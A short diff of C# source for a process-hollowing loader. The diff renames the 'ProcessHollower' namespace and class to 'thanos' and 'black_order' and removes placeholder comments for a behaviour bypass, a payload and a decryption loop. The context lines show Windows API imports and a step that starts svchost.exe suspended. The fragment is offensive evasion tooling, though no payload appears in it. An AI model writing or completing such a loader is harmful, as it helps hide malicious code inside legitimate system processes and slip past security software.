@@ -1,9 +1,9 @@
 using System;
 using System.Runtime.InteropServices;
 
-namespace ProcessHollower
+namespace thanos
 {
-    class Program
+    public class black_order
     {
         public const uint CREATE_SUSPENDED = 0x4;
         public const int ProcessBasicInformation = 0;
@@ -65,18 +65,18 @@ namespace ProcessHollower
 
         [DllImport("kernel32.dll", SetLastError = true)]
         private static extern uint ResumeThread(IntPtr hThread);
-        // Pinvoke lines here
+
         
 
-        static void Main(string[] args)
+        public static void Main()
         {
-            //Behaviour Bypass Here
 
 
-            //Payload Here
 
 
-            // Decryption Loop Here
+
+
+
 
 
             // Create the target process (e. g., svchost.exe) in a suspended state
